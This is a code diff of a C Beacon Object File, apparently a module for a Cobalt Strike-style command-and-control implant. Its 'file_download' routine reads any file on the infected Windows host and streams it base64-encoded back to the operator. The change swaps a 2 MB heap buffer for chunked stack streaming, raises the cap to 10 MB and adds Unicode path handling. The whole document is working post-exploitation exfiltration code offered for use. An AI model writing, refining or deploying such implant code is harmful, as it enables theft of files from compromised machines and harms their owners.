@@ -5,14 +5,22 @@
  *         as produced by FileBrowser.vue's downloadFile().
  *
  * Drives FileBrowser.vue. Output:
- *   === FILE: <path> ===\r\n
- *   <base64 of file bytes>
+ *   === FILE: <path> (<N> bytes) ===\r\n
+ *   <base64 of file bytes, streamed in 4096-char chunks>
  * The frontend strips the first line if it starts with "=== FILE:" and
  * base64-decodes the rest into a Blob, triggering a browser download.
  *
- * Capped at 2 MB so the base64 fits the core's ~4 MB line buffer (same cap as
- * download.c). Binary-safe: output goes through BeaconOutput with an explicit
- * length. The base64 encoder is copied from download.c.
+ * STREAMING (ported from bofs/file_ops/file_download.c): the file is read in
+ * 3072-byte chunks and base64-encoded + emitted per chunk. 3072 is divisible
+ * by 3, so every full chunk yields exactly 4096 base64 chars with NO padding —
+ * only the final (partial) chunk gets '=' padding. Concatenating all chunks
+ * produces valid contiguous base64 the frontend's atob() decodes whole. This
+ * keeps BOF memory at ~7 KB of STACK (no 2 MB heap alloc) and raises the cap
+ * to 10 MB. The whole output is still one line (the implant sends one message),
+ * so the core's line buffer must be ≥ ~14 MB — see session.go.
+ *
+ * UNICODE SAFE: CreateFileW + MultiByteToWideChar so non-ASCII (Chinese, etc.)
+ * paths open correctly. CreateFileA would mis-decode UTF-8 bytes as the ACP.
  *
  * Build (mingw):
  *   gcc -c examples/file_download.c -o examples/file_download.x64.o
@@ -20,20 +28,19 @@
 #include <windows.h>
 #include "beacon.h"
 
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
     DWORD, DWORD, HANDLE);
 DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
-DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
-DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
-DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
-DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
+DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
+DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(VOID);
+DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
 DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
 
 #define CP_UTF8_ 65001
+#define MAX_FILE  (10 * 1024 * 1024)   /* 10 MB cap (needs a ≥14 MB core line buffer) */
+#define READ_CHUNK 3072                /* divisible by 3 -> exactly 4096 base64 chars, no mid-stream padding */
 
-#define MAX_FILE  (2 * 1024 * 1024)   /* 2 MB cap */
 static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 /* base64-encode `len` bytes of `src` into `dst`; returns chars written. */
@@ -112,32 +119,47 @@ void go(char *args, int alen) {
         return;
     }
 
-    HANDLE heap = KERNEL32$GetProcessHeap();
-    unsigned char *raw = (unsigned char *) KERNEL32$HeapAlloc(heap, 0, MAX_FILE);
-    if (!raw) { KERNEL32$CloseHandle(h); BeaconPrintf(CALLBACK_ERROR, "file_download: out of memory"); return; }
-    DWORD total = 0, got = 0;
-    while (total < MAX_FILE) {
-        DWORD want = MAX_FILE - total > 65536 ? 65536 : MAX_FILE - total;
-        if (!KERNEL32$ReadFile(h, raw + total, want, &got, NULL) || got == 0) break;
-        total += got;
+    /* Pre-check size — reject files > 10 MB so we don't OOM the core's line
+     * buffer mid-stream. GetFileSize fails for files > 4 GB on 32-bit DWORD;
+     * that's fine (we cap at 10 MB anyway). */
+    DWORD fileSize = KERNEL32$GetFileSize(h, NULL);
+    int truncated = 0;
+    if (fileSize == INVALID_FILE_SIZE) {
+        /* can't determine size (e.g. pipe/device) — stream up to the cap */
+        fileSize = 0;
+    } else if (fileSize > MAX_FILE) {
+        KERNEL32$CloseHandle(h);
+        BeaconPrintf(CALLBACK_ERROR, "file_download: %s too large (%lu bytes, max %d)",
+                     path, fileSize, MAX_FILE);
+        return;
     }
-    KERNEL32$CloseHandle(h);
 
-    /* b64 buffer: 4/3 of raw + header + NUL. */
-    int b64cap = (total / 3 + 1) * 4 + 4096;
-    char *out = (char *) KERNEL32$HeapAlloc(heap, 0, b64cap);
-    if (!out) { KERNEL32$HeapFree(heap, 0, raw); BeaconPrintf(CALLBACK_ERROR, "file_download: out of memory"); return; }
     /* Header line — the frontend strips it when it starts with "=== FILE:".
      * Include the path and byte count for the operator log. */
-    int o = MSVCRT$_snprintf(out, b64cap - 1, "=== FILE: %s (%lu bytes%s) ===\r\n",
-        path, total, total >= MAX_FILE ? " truncated" : "");
-    o += b64encode(raw, total, out + o);
-    out[o++] = '\r';
-    out[o++] = '\n';
-    out[o] = 0;
+    {
+        char header[300];
+        int hlen = MSVCRT$_snprintf(header, sizeof(header) - 1,
+            "=== FILE: %s (%lu bytes) ===\r\n", path, fileSize);
+        BeaconOutput(CALLBACK_OUTPUT, header, hlen);
+    }
 
-    BeaconOutput(CALLBACK_OUTPUT, out, o);
+    /* Stream: read 3072-byte chunks, base64-encode (4096 chars, no padding
+     * mid-stream), emit each via BeaconOutput. The loader concatenates all
+     * BeaconOutput calls into one buffer, so the frontend receives one
+     * contiguous base64 blob. Pure-ASCII output -> lossless UTF-8 round-trip. */
+    unsigned char raw[READ_CHUNK];
+    char b64[4100];   /* 4096 base64 chars + margin */
+    DWORD total = 0, got = 0;
+    while (total < MAX_FILE) {
+        if (!KERNEL32$ReadFile(h, raw, READ_CHUNK, &got, NULL) || got == 0) break;
+        int blen = b64encode(raw, (int)got, b64);
+        BeaconOutput(CALLBACK_OUTPUT, b64, blen);
+        total += got;
+    }
+    if (total >= MAX_FILE) truncated = 1;
+    KERNEL32$CloseHandle(h);
 
-    KERNEL32$HeapFree(heap, 0, out);
-    KERNEL32$HeapFree(heap, 0, raw);
+    if (truncated) {
+        BeaconPrintf(CALLBACK_ERROR, "file_download: truncated at %d bytes", MAX_FILE);
+    }
 }
